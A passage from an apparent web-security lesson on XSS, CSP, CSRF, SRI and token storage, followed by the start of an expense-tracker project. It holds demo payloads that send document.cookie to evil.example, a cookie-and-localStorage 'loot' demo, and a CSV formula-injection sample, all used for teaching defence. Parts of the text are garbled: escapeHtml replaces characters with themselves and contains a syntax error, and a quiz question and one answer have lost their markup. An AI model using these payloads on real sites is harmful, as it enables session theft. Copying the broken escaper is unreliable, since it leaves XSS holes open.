JavaScript

const payloads = [
  'Great lesson, thanks!',
  'The <b>closure</b> part finally clicked.',
  'Nice! <img src=x onerror="console.log(\'XSS ran, cookie: \' + document.cookie)">',
  'Hi <script>fetch("https://evil.example/?c=" + document.cookie)<\/script>there',
];
const textarea = document.querySelector('#text');

// Parse markup WITHOUT running it: template content is inert
function inert(markup) {
  const tpl = document.createElement('template');
  tpl.innerHTML = markup; // nothing loads, no handler can fire here
  return tpl.content;
}

function findDangers(markup) {
  const found = [];
  for (const el of inert(markup).querySelectorAll('*')) {
    const tag = el.tagName.toLowerCase();
    if (tag === 'script') found.push('Keep a <script> in the DOM (innerHTML does not run it, but it is a red flag)');
    if (['iframe', 'object', 'embed'].includes(tag)) found.push('Load another page with <' + tag + '>');
    for (const attr of el.attributes) {
      if (attr.name.startsWith('on')) found.push('RUN the ' + attr.name + ' handler on <' + tag + '>: ' + attr.value);
      if (/^\s*javascript:/i.test(attr.value)) found.push('Create a javascript: URL in ' + attr.name);
    }
  }
  return found;
}

// A tiny allowlist sanitiser for teaching. In real apps use DOMPurify.
const ALLOWED = new Set(['B', 'STRONG', 'I', 'EM', 'CODE']);
function sanitise(markup) {
  const out = document.createDocumentFragment();
  const copy = (from, to) => {
    for (const node of from.childNodes) {
      if (node.nodeType === Node.TEXT_NODE) to.append(node.textContent);
      else if (node.nodeType !== Node.ELEMENT_NODE || node.tagName === 'SCRIPT') continue;
      else if (ALLOWED.has(node.tagName)) {
        const el = document.createElement(node.tagName); // fresh element, no attributes
        copy(node, el);
        to.append(el);
      } else copy(node, to); // unknown tag: keep only its text
    }
  };
  copy(inert(markup), out);
  return out;
}

function post(markup) {
  document.querySelector('#raw').textContent = markup; // shown as text, never parsed live
  const dangers = findDangers(markup);
  const list = document.querySelector('#danger');
  list.replaceChildren(...(dangers.length ? dangers : ['Nothing dangerous: just text']).map((d) => {
    const li = document.createElement('li');
    li.textContent = d;
    return li;
  }));
  document.querySelector('#text-out').textContent = markup;
  document.querySelector('#clean-out').replaceChildren(sanitise(markup));
  console.log('Dangerous parts found:', dangers.length);
}

document.querySelector('.presets').addEventListener('click', (event) => {
  const i = event.target.dataset.p;
  if (i !== undefined) textarea.value = payloads[i];
});
document.querySelector('#form').addEventListener('submit', (event) => {
  event.preventDefault();
  post(textarea.value);
});

document.cookie = 'session=demo123';
textarea.value = payloads[2];
post(payloads[2]);

Pick a payload and press Post. Nothing here is inserted with innerHTML: the left pane parses the text in an inert template and reports what innerHTML would have executed.

Watch out: scripts inserted with innerHTML do not run, and people wrongly conclude innerHTML is safe. Event handler attributes (onerror, onload, onmouseover) do run, and they are what real payloads use.

When you need user HTML: sanitise with DOMPurify

Sometimes users must format text: a blog editor, a rich product description. Then you need a sanitiser, which parses the HTML and keeps only an allowlist of safe tags and attributes. Do not write your own regex for this: HTML parsing has endless edge cases. Use DOMPurify, the widely used, well-tested library:

import DOMPurify from 'dompurify'; // npm install dompurify

const clean = DOMPurify.sanitize(comment.html, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'code', 'a', 'p', 'br'],
  ALLOWED_ATTR: ['href'],
});
commentBody.innerHTML = clean; // OK: sanitised immediately before the sink

Sanitise right before inserting, on the client, even if the server also sanitised. A built-in Sanitizer API (element.setHTML()) is being standardised and rolling out in browsers, and Trusted Types (enabled with the CSP directive require-trusted-types-for 'script'; Chromium has had it for years, Safari and Firefox added it more recently) can make the browser reject raw strings in sinks entirely. Check MDN for current support before relying on either, and keep DOMPurify as your baseline.

URLs are a separate context

HTML escaping does not make a link safe: javascript:alert(1) contains no < or quotes. Parse user URLs with new URL(), which normalises case and whitespace, and allow only the protocols you expect. Add rel="noopener noreferrer" to external links that open in a new tab so the new page cannot reach back through window.opener (modern browsers imply noopener for target="_blank", but being explicit costs nothing).

Try it: Safe links from user input

HTML

<main class="wrap">
  <section class="card">
    <h1>Edit profile</h1>
    <label for="site">Website</label>
    <div class="row">
      <input id="site" placeholder="https://your-portfolio.dev" autocomplete="url">
      <button id="save" class="btn" type="button">Save</button>
    </div>
    <div class="presets">
      <button type="button" class="chip">https://anu.ralfiz.dev</button>
      <button type="button" class="chip">  JaVaScRiPt:console.log('pwned')</button>
      <button type="button" class="chip">data:text/html,<h1>Hi</h1></button>
      <button type="button" class="chip">www.no-protocol.dev</button>
    </div>
  </section>
  <section class="card profile">
    <div class="avatar" aria-hidden="true">AK</div>
    <div class="who"><strong>Anu Krishnan</strong><span id="link-slot" class="muted">No website</span></div>
    <span id="verdict" class="pill">–</span>
  </section>
</main>

CSS

:root { --accent: #0f766e; --line: #e5e7eb; --muted: #6b7280; }
body { margin: 0; background: #f0fdfa; }
.wrap { max-width: 560px; margin: 0 auto; padding: 16px; display: grid; gap: 12px; }
.card { background: #fff; border: 1px solid var(--line); border-radius: 14px; padding: 16px; }
h1 { font-size: 18px; margin: 0 0 8px; }
label { font-size: 13px; font-weight: 600; color: #374151; }
.row { display: flex; gap: 8px; margin: 6px 0 10px; }
input { flex: 1; min-width: 0; font: inherit; padding: 10px 12px; border: 1px solid var(--line);
  border-radius: 10px; }
input:focus { outline: 2px solid var(--accent); border-color: transparent; }
.btn { font: inherit; font-weight: 600; border: 0; border-radius: 10px; padding: 10px 16px;
  background: var(--accent); color: #fff; cursor: pointer; }
.presets { display: flex; flex-wrap: wrap; gap: 6px; }
.chip { font: 12px ui-monospace, Menlo, monospace; border: 1px solid var(--line); background: #f9fafb;
  border-radius: 99px; padding: 4px 10px; cursor: pointer; white-space: pre; max-width: 100%;
  overflow: hidden; text-overflow: ellipsis; }
.chip:hover { border-color: var(--accent); }
.btn:focus-visible, .chip:focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; }
.profile { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
.avatar { width: 44px; height: 44px; border-radius: 50%; display: grid; place-items: center;
  background: linear-gradient(135deg, #99f6e4, #a5b4fc); font-weight: 700; color: #134e4a; }
.who { display: grid; flex: 1; min-width: 0; }
.who a { color: var(--accent); font-weight: 600; word-break: break-all; }
.muted { color: var(--muted); font-size: 14px; }
.pill { font-size: 12px; font-weight: 700; padding: 4px 10px; border-radius: 99px; background: #f3f4f6; }
.pill.ok { background: #dcfce7; color: #166534; }
.pill.no { background: #fee2e2; color: #991b1b; }

JavaScript

const ALLOWED_PROTOCOLS = new Set(['https:', 'http:']);

// Returns a normalised URL string, or null if it is not safe to link to
function safeUrl(input) {
  try {
    const url = new URL(input.trim()); // throws for relative or garbage input
    return ALLOWED_PROTOCOLS.has(url.protocol) ? url.href : null;
  } catch {
    return null;
  }
}

function showWebsite(input) {
  const slot = document.querySelector('#link-slot');
  const verdict = document.querySelector('#verdict');
  const href = safeUrl(input);
  let protocol = 'invalid URL';
  try { protocol = new URL(input.trim()).protocol; } catch { /* keep 'invalid URL' */ }
  try { protocol = new URL(input.trim()).protocol; } catch {}

  if (href) {
    const a = document.createElement('a');
    a.href = href;                     // a property, set from a checked value
    a.textContent = new URL(href).host; // text, never HTML
    a.target = '_blank';
    a.rel = 'noopener noreferrer';
    slot.replaceChildren(a);
    verdict.textContent = 'Allowed ' + protocol;
    verdict.className = 'pill ok';
  } else {
    slot.textContent = 'Link not shown';
    verdict.textContent = 'Blocked ' + protocol;
    verdict.className = 'pill no';
  }
  console.log(JSON.stringify(input), '→', href ?? 'blocked (' + protocol + ')');
}

const input = document.querySelector('#site');
document.querySelector('.presets').addEventListener('click', (event) => {
  if (!event.target.matches('.chip')) return;
  input.value = event.target.textContent;
  showWebsite(input.value);
});
document.querySelector('#save').addEventListener('click', () => showWebsite(input.value));

showWebsite('https://anu.ralfiz.dev');
input.value = '  JaVaScRiPt:console.log(\'pwned\')';
showWebsite(input.value);

Try each preset. new URL() normalises tricks like extra spaces and mixed case, so the protocol check cannot be dodged. Only http: and https: links are rendered.

If you generate HTML strings (for example in a tiny template helper), escape every interpolated value, and remember that escaping only covers the text and attribute contexts:

Try it: Escaping is context-specific

JavaScript

const escapeHtml = (value) => String(value)
  .replaceAll('&', '&')
  .replaceAll('<', '<')
  .replaceAll('>', '>')
  .replaceAll('"', '"')
  .replaceAll("'", ''');

// Tagged template: the fixed parts are trusted, every ${value} is escaped
function html(strings, ...values) {
  return strings.reduce(
    (out, str, i) => out + str + (i < values.length ? escapeHtml(values[i]) : ''),
    '',
  );
}

const review = { author: 'Mallory', text: '<img src=x onerror=alert(1)>' };
console.log(html`<li><b>${review.author}</b>: ${review.text}</li>`);

// Attribute context: quotes are escaped too, so the value cannot break out
const name = '" onmouseover="alert(1)';
console.log(html`<input value="${name}">`);

// URL context: escaping does NOT help, javascript: has no special characters
const site = 'javascript:alert(1)';
console.log(html`<a href="${site}">website</a>`);
console.log('Still dangerous: validate URLs with new URL() and a protocol allowlist.');

An html tagged template escapes every interpolated value, which is enough between tags. The last example shows why URLs still need their own check.

Content Security Policy: the second wall

A Content Security Policy is an HTTP response header that tells the browser where scripts, styles, images, frames and connections may come from. With a good CSP, an injected onerror handler or inline <script> is blocked even if you have an XSS bug. It is defence in depth, not a replacement for safe rendering.

Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-r4nd0m' 'strict-dynamic';
  object-src 'none';
  base-uri 'self';
  frame-ancestors 'none';
  report-to csp-endpoint

Key ideas: no 'unsafe-inline' for scripts (that would allow the injected handlers); a per-response random nonce on your own script tags lets them run; object-src 'none' blocks old plug-ins. Roll a new policy out with Content-Security-Policy-Report-Only first to see what would break. A <meta http-equiv="Content-Security-Policy"> tag works for static sites, but it cannot set frame-ancestors or reporting, so a header is better.

CORS is not CSRF protection

CORSCSRF
What it isA way for a server to allow other origins to read its responsesAn attack: another site makes the browser send a request to yours, with your cookies
Who sets itThe server, with Access-Control-Allow-Origin and related headersThe attacker, with a hidden form or image
Stops the request being sent?No: simple requests are sent; only reading the response is blockedDefences: SameSite cookies, CSRF tokens, checking the Origin header, no state changes on GET

SameSite is the cookie attribute that does most of the CSRF work today. Strict: never sent on cross-site requests. Lax: sent on top-level link navigations but not on cross-site POSTs, images or fetches; Chromium treats cookies without the attribute as Lax. None: always sent, and must be combined with Secure. A session cookie should normally be HttpOnly; Secure; SameSite=Lax (or Strict), set by the server.

Clickjacking, third-party scripts and secrets

Clickjacking loads your site in an invisible iframe on another page and tricks users into clicking your “Delete account” button. Stop it with the header Content-Security-Policy: frame-ancestors 'none' (or 'self'); older browsers understand X-Frame-Options: DENY.

Third-party scripts (analytics, chat widgets, CDN libraries) run with full power on your page. If the provider is compromised, so are you. Load as few as possible, pin exact versions, and add Subresource Integrity so a changed file is refused:

<script src="https://cdn.jsdelivr.net/npm/dompurify@3.x.y/dist/purify.min.js"
  integrity="sha384-(hash of that exact file)"
  crossorigin="anonymous"></script>

Generate the hash from the exact file with openssl dgst -sha384 -binary purify.min.js | openssl base64 -A, or copy it from the CDN’s SRI option. An unversioned URL cannot use SRI, because its content changes.

Secrets never belong in front-end code. Everything you ship is readable in DevTools, including bundled environment variables such as Vite’s import.meta.env.VITE_*. Payment secrets, database passwords and private API keys stay on a server; the browser calls your backend, which calls the provider. Keys designed to be public (for example a maps key restricted to your domain) are the only exception.

Where to keep tokens: the trade-offs

StorageReadable by an XSS script?Sent automatically?Main risk
localStorageYesNoAny injected script can steal it and use it elsewhere, for as long as it is valid
Memory (a JS variable)Harder, while the page is openNoLost on reload, so it needs a refresh mechanism
HttpOnly cookieNoYesCSRF, handled with SameSite and tokens

A common, solid pattern: the server keeps the session (or a refresh token) in an HttpOnly; Secure; SameSite cookie, and any short-lived access token lives only in memory. Be honest about the limit: even with HttpOnly, an XSS script can still send requests as the user while the page is open. Preventing XSS stays job number one.

Try it: What one injected script can reach

JavaScript

// Pretend the app stored these after login
localStorage.setItem('accessToken', 'eyJhbGciOiJIUzI1NiJ9.demo.signature');
localStorage.setItem('user', JSON.stringify({ id: 7, name: 'Anu' }));
document.cookie = 'theme=dark';
document.cookie = 'cartId=c_1042';

// ...then ONE line of attacker code runs on the page (via XSS or a bad script)
const loot = {
  localStorage: { ...localStorage },
  cookies: document.cookie,
  pageTitle: document.title,
};
console.log(loot);
console.log('Next step for an attacker: send it away with fetch() or new Image().src');

// Clean up the demo
localStorage.clear();
document.cookie = 'theme=; max-age=0';
document.cookie = 'cartId=; max-age=0';

This is why an XSS bug is so serious, and why tokens in localStorage are risky: any script on the page can read them. HttpOnly cookies would not appear here.

Example: securing the Ralfiz comments widget

The lab’s starter is a comments widget with every classic bug. You fix it in layers:

  1. Render safely. renderComment() builds elements and uses textContent for the name and body.
  2. Check links. The optional website goes through safeUrl(); failures show no link.
  3. Allow a little formatting. If DOMPurify loaded, the body is sanitised with ALLOWED_TAGS: ['b', 'i', 'code'] and ALLOWED_ATTR: []; otherwise it falls back to text. Security features must fail closed.
  4. Add a CSP. A meta tag allows scripts only from your origin and the CDN. Allowing a whole public CDN host is a lab shortcut: an attacker who can inject a script tag could load any package from it. In production, self-host the file (or npm install it), or list the exact file path in script-src, or use nonces.
  5. Remove the secret. The fake payment key goes; a comment points to a backend endpoint.
  6. Move the token. The session token leaves localStorage.

The acceptance test: posting <img src=x onerror="console.log('XSS')"> shows that text on the page and logs nothing.

Common mistakes

1. Building HTML strings from API data.

grid.innerHTML = products.map((p) => `<h3>${p.title}</h3>`).join('');

Fix: create elements and set textContent, or escape every value with a helper; data from your own API is still untrusted.

2. Blocklisting instead of allowlisting.

if (!url.startsWith('javascript:')) link.href = url; // ' JavaScript:' gets through

Fix: parse with new URL() and allow only https:/http:.

3. Sanitising once, far from the sink. Cleaning on input, then editing the string later, can reintroduce markup. Fix: sanitise immediately before innerHTML.

4. Believing CORS protects the API. Access-Control-Allow-Origin does not stop a cross-site form post. Fix: SameSite cookies plus CSRF tokens or Origin checks on the server.

5. Secrets in .env for the front-end. VITE_STRIPE_SECRET=sk_live_… ends up in the bundle. Fix: keep it on the server and expose an endpoint.

Interview and real-world notes

  • Name the three XSS types and the one root cause: untrusted data reaching a code-interpreting sink.
  • Layered answer: textContent by default, DOMPurify when HTML is required, URL allowlists, CSP with nonces, and Trusted Types where available.
  • Explain CORS versus CSRF in two sentences each; interviewers love this confusion.
  • Know the cookie flags: HttpOnly (no JS access), Secure (HTTPS only), SameSite (cross-site sending).
  • Say plainly that tokens in localStorage are readable by any XSS, and describe the HttpOnly cookie plus in-memory token pattern.
  • Frameworks help (React escapes text by default) but have escape hatches: dangerouslySetInnerHTML, v-html and {@html} need the same care as innerHTML.

Predict the output

Read each snippet and decide what it prints before you run it. The answers are at the end of this section.

Snippet 1. What is logged?

const div = document.createElement('div');
div.textContent = '<b>Hi</b>';
console.log(div.innerHTML);
console.log(div.children.length);
  • A 
    <b>Hi</b>
1
  • B 
    <b>Hi</b>
0
  • C 
    Hi
0
  • D 
    <b>Hi</b>
1

Snippet 2. What is logged? (The <\/script> spelling is only there so the snippet can live inside a page.)

const box = document.createElement('div');
document.body.append(box);
box.innerHTML = '<script>console.log("script ran")<\/script><p>Hello</p>';
console.log(box.children.length, box.querySelector('p').textContent);
  • A 2 Hello
  • B 
    script ran
2 Hello
  • C 1 Hello
  • D 
    script ran
1 Hello

Snippet 3. What is logged?

const inputs = ['https://ralfiz.dev', ' JavaScript:alert(1)', '/profile'];
for (const s of inputs) {
  try {
    console.log(new URL(s, 'https://shop.ralfiz.dev').protocol);
  } catch {
    console.log('invalid');
  }
}
  • A 
    https:
invalid
https:
  • B 
    https:
JavaScript:
invalid
  • C 
    https:
javascript:
invalid
  • D 
    https:
javascript:
https:

Answers

  1. B. textContent stores the characters as text. Reading innerHTML serialises that text, escaping < and > as < and >. No element was created, so there are 0 children.
  2. A. Scripts inserted with innerHTML are added to the DOM but never executed. That is not protection: event handler attributes such as onerror still run, which is why attackers use them.
  3. D. The URL parser trims leading spaces and lowercases the scheme, so the check sees javascript:. The relative path is resolved against the base, giving https:. Always check the parsed protocol, not the raw string.

terms.definition: An attack where attacker-controlled data is interpreted as HTML or JavaScript in your page, so their code runs with your user’s session.
A DOM API that turns a string into markup or code, such as innerHTML, outerHTML, insertAdjacentHTML, document.write, eval or an href set to a javascript: URL.
A library such as DOMPurify that parses HTML and removes anything that can run code, keeping only an allowlist of safe tags and attributes.
An HTTP response header that tells the browser which sources of scripts, styles, images and frames are allowed, blocking injected inline scripts.
Cross-site request forgery: another site makes the user’s browser send a request to your site, and the browser attaches your cookies automatically.
A cookie attribute (Strict, Lax or None) that controls whether the cookie is sent on requests started by other sites.
An integrity="sha384-…" attribute on script and link tags; the browser refuses the file if its hash does not match.

lessons.examTip: In interviews, answer “how do you prevent XSS?” in layers: never put untrusted data into HTML sinks (textContent instead), sanitise when HTML is required, and add CSP as defence in depth.

quiz.question:
A product review is shown with list.innerHTML += `
  • ${review.text}
    • `. A reviewer types . What kind of attack is this, and what is the simplest fix?
options: CSRF; add a CSRF token
Stored XSS; build the li with createElement and set textContent
Clickjacking; add frame-ancestors
Reflected XSS; encode the URL with encodeURIComponent
quiz.explanation: The payload is saved on the server and runs for every visitor who views it, so it is stored XSS. textContent never parses HTML, so the markup is shown as harmless text.

quiz.question: Which statement about CORS is true?
options: CORS protects your API from CSRF attacks
CORS headers are set in front-end JavaScript
CORS lets a server allow other origins to read its responses; it does not stop simple cross-site requests, such as a form post, from being sent
CORS encrypts requests between origins
quiz.explanation: CORS relaxes the same-origin policy for reading responses. Only non-simple requests get a preflight; a cross-site form post can still reach your server with cookies, which is why CSRF needs SameSite cookies, tokens or Origin checks.

quiz.question: Your team wants to keep the payment provider’s secret key in a Vite environment variable called VITE_PAY_SECRET. What is wrong?
options: Nothing, environment variables are private
Vite variables must start with NEXT_
It should be stored in localStorage instead
Anything used by front-end code is shipped to every browser; secrets must stay on a server
quiz.explanation: import.meta.env values prefixed with VITE_ are inlined into the bundle, so anyone can read them in DevTools. Put the secret in a backend endpoint and call that.

quiz.question: You load a charting library from a public CDN. Which protection makes sure a tampered file is not executed?
options: Subresource Integrity: integrity="sha384-…" plus crossorigin="anonymous" on a pinned version
Adding defer to the script tag
Loading it with type="module"
Setting SameSite=Strict on your cookies
quiz.explanation: SRI compares the downloaded file’s hash with the one you wrote. If the CDN file changes, the browser refuses to run it. It needs an exact, pinned version.

lessons.title: Project: Expense Tracker
lessons.summaryHtml:
In this project you build Ralfiz Money, a complete expense tracker, using only the DOM skills from this track. You can add, edit and delete expenses, pick a category, filter by month and see totals formatted in rupees with Intl.NumberFormat.

A live SVG donut chart shows spending by category. Everything is saved to localStorage, and you can export the current month as a CSV file made with a Blob.

You build it in stages: data model and money maths, then state, form and list, then the chart, then CSV export, then the finished app. Each stage keeps one rule: event → update state → save → render.
lessons.contentHtml:
In plain words

This is your first complete project in the DOM track. You will build Ralfiz Money, an expense tracker a freelancer or a small office could really use. You type what you paid for, how much, the category and the date. The app lists your expenses, adds them up in rupees, draws a donut chart by category, remembers everything after a reload and exports a spreadsheet file.

Nothing here is new on its own. You have met forms, templates, delegation, localStorage, SVG and Intl in earlier lessons. The new skill is putting them together so the code stays small and predictable as features pile up. That is what junior front-end work looks like: less “which method?”, more “where does this piece of logic live?”.

Why it matters

Interviewers and clients rarely ask you to recite classList methods. They look at a project and ask: does it work, does it survive a reload, does it handle money correctly, can a keyboard user use it, and could another developer add a feature next month? This project answers all five.

It also contains three bugs that hit real products every year: money summed as decimals, dates shifted by time zones, and a CSV export that breaks on a comma or runs a formula in Excel. You will avoid all three on purpose.

How it works

The whole app follows one loop. An event happens (submit, click, change). The handler builds a new expenses array and passes it to commit(). commit() stores it in state, saves it to localStorage and calls render(). render() draws everything from state. No handler ever touches the list, the totals or the chart directly.

PieceLives inWhy there
Expenses, current month, edit idstateThe single source of truth
Total, count, top category, category sums, month listcomputed in render()Derived state is never stored, so it can never go stale
Savingcommit()One place, so no change forgets to save
Formatting (₹, dates)Intl formatters created onceCreating formatters is slow; reusing them is cheap

Stage 1: a data model that handles money correctly

Each expense is a plain object: { id, title, amount, cat, date }. Two choices matter. First, amount is a whole number of paise: ₹1,850.00 is stored as 185000. JavaScript numbers are binary floating point, so 0.1 + 0.2 is 0.30000000000000004. Whole numbers up to Number.MAX_SAFE_INTEGER (over nine thousand trillion) are stored exactly, so sums of paise are always right. You divide by 100 only at the last moment, inside the formatter.

Second, date is a 'YYYY-MM-DD' string, not a Date object. Strings survive JSON unchanged, sort correctly with localeCompare, and the month is simply date.slice(0, 7). No time zone can move an expense into the wrong month.

JavaScript

const expenses = [
  { title: 'Team lunch', amount: 185000, cat: 'food', date: '2026-09-12' },
  { title: 'Cab to airport', amount: 142050, cat: 'travel', date: '2026-09-18' },
  { title: 'Groceries', amount: 312075, cat: 'food', date: '2026-08-28' },
  { title: 'Electricity', amount: 218000, cat: 'bills', date: '2026-08-10' },
];

const inr = new Intl.NumberFormat('en-IN', { style: 'currency', currency: 'INR' });
const money = (paise) => inr.format(paise / 100);
const sum = (list) => list.reduce((total, e) => total + e.amount, 0);
const inMonth = (list, month) => list.filter((e) => e.date.startsWith(month));

console.log('All time:', money(sum(expenses)));
const sep = inMonth(expenses, '2026-09');
console.log('September:', money(sum(sep)), `(${sep.length} expenses)`);

// Group, then turn each group into a total
const byCat = Object.groupBy(expenses, (e) => e.cat);
const totals = Object.fromEntries(
  Object.entries(byCat).map(([cat, items]) => [cat, money(sum(items))]),
);
console.table(totals);

console.log('Decimals:', 0.1 + 0.2, '| paise:', (10 + 20) / 100);

Amounts are whole paise; they only become rupees when formatted. Compare the last line: 0.1 + 0.2 in decimals vs in paise.

Object.groupBy (ES2024) turns the list into { food: [...], bills: [...] }. Mapping each group to a sum gives the chart data. Intl.NumberFormat('en-IN', { style: 'currency', currency: 'INR' }) prints Indian grouping, ₹12,34,567.50, with no string hacking.

Stage 2: state, form and list

The form uses real validation attributes (required, min, step, maxlength), so the browser blocks bad input before your submit handler runs. Inside the handler, Object.fromEntries(new FormData(form)) gives you every named field as a string. Convert the amount with Math.round(Number(data.amount) * 100): the Math.round removes tiny errors such as 19.99 * 100 = 1998.9999999999998.

function commit(expenses) {
  state.expenses = expenses;                       // 1. update
  localStorage.setItem(KEY, JSON.stringify(expenses)); // 2. save
  render();                                        // 3. draw
}

// add: a new array, never push into the old one
commit([...state.expenses, { id: Date.now(), ...entry }]);
// delete
commit(state.expenses.filter((e) => e.id !== id));
// edit
commit(state.expenses.map((e) => (e.id === id ? { ...e, ...entry } : e)));

Creating new arrays instead of mutating makes “what changed?” easy to reason about, and it is exactly how React and other frameworks expect you to update state (lesson dm24). The list uses one delegated listener on the <ul>. Each row carries data-id, and ev.target.closest('button[data-act]') tells you which button was pressed, even for rows rendered later.

const KEY = 'stage2-expenses';
const ICONS = { food: '🍛', travel: '🚕', bills: '💡' };
const inr = new Intl.NumberFormat('en-IN', { style: 'currency', currency: 'INR' });
const form = document.querySelector('#form');
const list = document.querySelector('#list');

// 1. One state object, loaded once
const SEED = [
  { id: 2, title: 'Team lunch', cat: 'food', amount: 185000 },
  { id: 1, title: 'Cab to Kochi airport', cat: 'travel', amount: 142050 },
];
const state = { expenses: JSON.parse(localStorage.getItem(KEY)) ?? SEED };

// 2. Every change goes through commit: update, save, render
function commit(expenses) {
  state.expenses = expenses;
  localStorage.setItem(KEY, JSON.stringify(expenses));
  render();
}

// 3. render() draws the whole list from state
function render() {
  list.replaceChildren(...state.expenses.map((e) => {
    const li = document.createElement('li');
    li.dataset.id = e.id;
    const title = Object.assign(document.createElement('span'), { className: 't' });
    title.append(`${ICONS[e.cat]} `, e.title);          // text nodes: safe
    const amount = document.createElement('small');
    amount.textContent = inr.format(e.amount / 100);
    const del = Object.assign(document.createElement('button'),
      { className: 'del', textContent: '✕', type: 'button' });
    del.setAttribute('aria-label', `Delete ${e.title}`);
    li.append(title, amount, del);
    return li;
  }));
  const total = state.expenses.reduce((s, e) => s + e.amount, 0);
  document.querySelector('#total').textContent = inr.format(total / 100);
  document.querySelector('#empty').hidden = state.expenses.length > 0;
}

form.addEventListener('submit', (ev) => {
  ev.preventDefault();
  const data = Object.fromEntries(new FormData(form));
  const entry = { id: Date.now(), title: data.title.trim(), cat: data.cat,
    amount: Math.round(Number(data.amount) * 100) };   // rupees → paise
  commit([entry, ...state.expenses]);
  console.log('Added', entry);
  form.reset();
  form.elements.title.focus();
});

// 4. One delegated listener handles every delete button
list.addEventListener('click', (ev) => {
  const btn = ev.target.closest('.del');
  if (!btn) return;
  const id = Number(btn.closest('li').dataset.id);
  commit(state.expenses.filter((e) => e.id !== id));
});

render();
console.log('Loaded', state.expenses.length, 'expenses from storage');

Stage 3: a donut chart in SVG

You do not need a chart library for a donut. Draw a circle with radius 15.915: its circumference is 2 × π × 15.915 ≈ 100. Now a stroke with stroke-dasharray="40 60" paints 40% of the ring and leaves a 60% gap. Each segment is another circle on top, shifted with stroke-dashoffset. Starting at 25 puts the first segment at 12 o’clock; each next segment starts where the last ended, so you subtract its percentage.

let offset = 25;
for (const { cat, sum } of sums) {
  const pct = (sum / total) * 100;
  const seg = document.createElementNS(NS, 'circle'); // not createElement!
  seg.setAttribute('stroke-dasharray', `${pct} ${100 - pct}`);
  seg.setAttribute('stroke-dashoffset', offset);
  svg.append(seg);
  offset -= pct;
}

SVG elements live in the SVG namespace, so you must use createElementNS('http://www.w3.org/2000/svg', …) and setAttribute. A <title> child gives each segment a tooltip, and role="img" with a label gives screen readers one summary. The CSS transition on stroke-dasharray makes month switches animate for free.

const NS = 'http://www.w3.org/2000/svg';
const CATS = {
  food: { label: 'Food', color: '#f97316' },
  travel: { label: 'Travel', color: '#0ea5e9' },
  bills: { label: 'Bills', color: '#8b5cf6' },
  shopping: { label: 'Shopping', color: '#ec4899' },
};
const DATA = {
  '2026-08': { food: 412000, bills: 218000, travel: 56000 },
  '2026-09': { bills: 1200000, food: 185000, travel: 142050, shopping: 249900 },
};
const inr = new Intl.NumberFormat('en-IN',
  { style: 'currency', currency: 'INR', maximumFractionDigits: 0 });
const svg = document.querySelector('#donut');

function el(tag, className, text = '') {
  return Object.assign(document.createElement(tag), { className, textContent: text });
}

function render(month) {
  const sums = Object.entries(DATA[month]).toSorted((a, b) => b[1] - a[1]);
  const total = sums.reduce((s, [, v]) => s + v, 0);
  svg.querySelectorAll('.seg').forEach((n) => n.remove());
  let offset = 25;                          // start at 12 o'clock
  for (const [cat, value] of sums) {
    const pct = (value / total) * 100;
    const seg = document.createElementNS(NS, 'circle');   // SVG needs the namespace
    const attrs = { class: 'seg', cx: 21, cy: 21, r: 15.915, stroke: CATS[cat].color,
      'stroke-dasharray': `${pct - 0.8} ${100 - pct + 0.8}`, 'stroke-dashoffset': offset };
    for (const [k, v] of Object.entries(attrs)) seg.setAttribute(k, v);
    const tip = document.createElementNS(NS, 'title');
    tip.textContent = `${CATS[cat].label}: ${inr.format(value / 100)}`;
    seg.append(tip);
    svg.append(seg);
    offset -= pct;
  }
  document.querySelector('#sum').textContent = inr.format(total / 100);
  document.querySelector('#legend').replaceChildren(...sums.map(([cat, value]) => {
    const li = document.createElement('li');
    li.style.setProperty('--c', CATS[cat].color);
    li.append(el('span', 'dot'), el('span', '', CATS[cat].label),
      el('span', 'val', inr.format(value / 100)), el('b', '', `${Math.round((value / total) * 100)}%`));
    return li;
  }));
  console.log(month, sums.map(([c, v]) => `${c} ${((v / total) * 100).toFixed(1)}%`).join(', '));
}

document.querySelector('.seg-ctl').addEventListener('click', (ev) => {
  const btn = ev.target.closest('button');
  if (!btn) return;
  document.querySelectorAll('.seg-ctl button').forEach((b) => b.setAttribute('aria-pressed', b === btn));
  render(btn.dataset.m);
});
render('2026-09');

Switch months: render() removes the old segments and draws new ones. Hover the segments: each has a title tooltip.

Stage 4: CSV export with a Blob

A CSV file is text: one line per row, cells separated by commas. The trap is the data. A title like Team lunch, 6 people contains a comma and would split into two columns. The standard rule (RFC 4180) is: if a cell contains a comma, a double quote or a line break, wrap it in double quotes and double any quotes inside. Also, spreadsheets run any cell that starts with =, +, - or @ as a formula. Prefixing a quote character neutralises this CSV injection.

Try it: Stage 4: CSV text and a Blob

JavaScript

function csvCell(value) {
  let s = String(value);
  if (/^[=+\-@]/.test(s)) s = "'" + s;           // neutralise formulas
  return /[",\r\n]/.test(s) ? `"${s.replaceAll('"', '""')}"` : s;
}

const rows = [
  ['Date', 'Title', 'Category', 'Amount (INR)'],
  ['2026-09-12', 'Team lunch, 6 people', 'Food', '1850.00'],
  ['2026-09-18', 'Cab "airport" run', 'Travel', '1420.50'],
  ['2026-09-20', '=HYPERLINK("http://evil.example")', 'Other', '10.00'],
];
const csv = rows.map((row) => row.map(csvCell).join(',')).join('\r\n');
console.log(csv);

// The BOM tells Excel the file is UTF-8 (so ₹ and emoji survive)
const blob = new Blob(['﻿' + csv], { type: 'text/csv;charset=utf-8' });
console.log('Blob:', blob.size, 'bytes,', blob.type);

const url = URL.createObjectURL(blob);
console.log('Object URL starts with blob:', url.startsWith('blob:'));
URL.revokeObjectURL(url);                          // free the memory

Look at how the comma, the quotes and the formula-like title are escaped, and at the byte count of the Blob.

To download it, wrap the text in a Blob, make a temporary URL with URL.createObjectURL(blob), point an <a download="file.csv"> at it and call click(). Then call URL.revokeObjectURL so the memory is freed. The \uFEFF byte-order mark (an invisible first character) at the start tells Excel the file is UTF-8, so the ₹ sign survives. (The playground’s sandbox does not allow downloads, so there the export only logs its size; in your lab folder it downloads a real file.)

Example: the finished Ralfiz Money app

The final page combines every stage in about 160 lines of JavaScript. Walk through it in this order:

  1. Constants and formatters: CATS maps each category to a label, an emoji and a colour, used by the list, the legend and the chart. Formatters are created once.
  2. State: { expenses, month, editId }. load() wraps JSON.parse in try/catch, because stored data can be corrupted or edited by hand.
  3. render(): rebuilds the month options (derived from the data), computes the visible list, the total and the category sums, then calls renderList and renderChart.
